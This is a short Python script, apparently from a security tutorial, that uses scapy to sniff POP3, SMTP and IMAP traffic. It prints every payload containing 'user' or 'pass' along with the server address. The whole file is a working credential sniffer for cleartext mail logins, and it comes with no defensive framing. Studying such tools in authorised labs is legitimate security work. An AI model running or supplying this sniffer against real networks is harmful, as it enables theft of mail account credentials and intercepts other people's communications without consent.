from scapy.all import *

# sudo apt-get install python3-scapy

# our packet callback
def packet_callback(packet):
    # print (packet.show())

    if packet[TCP].payload:
        
        mail_packet = str(packet[TCP].payload)
        
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print(f"[*] Server: {packet[IP].dst} ")
            print(f"[*] {packet[TCP].payload}")

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)




